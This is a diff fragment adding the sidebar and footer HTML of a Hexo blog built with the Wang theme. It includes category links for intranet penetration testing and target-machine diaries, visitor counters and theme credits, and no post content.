+                <div class="category-item">
+                    <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" aria-label="分类: 内网渗透">
+                        内网渗透
+                        <span>(1)</span>
+                    </a>
+                </div>
+            
+                <div class="category-item">
+                    <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E6%97%A5%E8%AE%B0/" aria-label="分类: 靶机日记">
+                        靶机日记
+                        <span>(1)</span>
+                    </a>
+                </div>
+            
+        </div>
+    </div>
+</aside>
+
+    <!-- No categories available -->
+
+
+    <footer>
+    <span id="busuanzi_container_site_pv" style="display: inline;"></span>
+    <span>👁<span id="busuanzi_value_site_pv"></span></span>
+    <div class="padding border border-sub border-dotted fadein-right">
+        <span style="color:aliceblue">👤<span id="busuanzi_value_site_uv"></span></span>
+    </div>
+    <span>
+        由 <a target="_blank" rel="noopener" href="https://hexo.io" alt="Hexo">
+            <p class="hover-underline night" style="display: inline;">Hexo</p>
+        </a> 驱动
+        <p style="display: inline; color: red;">❤</p>
+        <a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang" alt="Wang">
+            <p class="hover-underline night" style="display: inline;">Wang</p>
+        </a> 主题构建
+    </span>
+
+    <!-- 带图片的链接 -->
+    <div class="footer-links">
+        
+    </div>
+
+    <!-- 纯文本链接 -->
+    <div class="footer-text-links">
+        
+    </div>
+</footer>
+    
+<script src="/js/background.js"></script>
+    
+</main>
+</body>
+</html>
